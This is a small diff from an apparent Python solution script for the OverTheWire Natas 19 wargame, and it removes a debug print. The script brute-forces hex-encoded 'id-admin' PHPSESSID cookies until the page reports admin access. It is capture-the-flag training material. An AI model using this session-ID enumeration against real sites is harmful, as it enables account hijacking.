@@ -202,7 +202,6 @@ for id in range(650):
                sessid=''+str(id)+'-admin'
                sessid=sessid.encode("hex")
                cookie={'PHPSESSID':''+sessid+''}
-               print cookie
                s=requests.get('http://natas19.natas.labs.overthewire.org',auth=auth,cookies=cookie)
                if "You are an admin"  in s.text:
                         print s.text
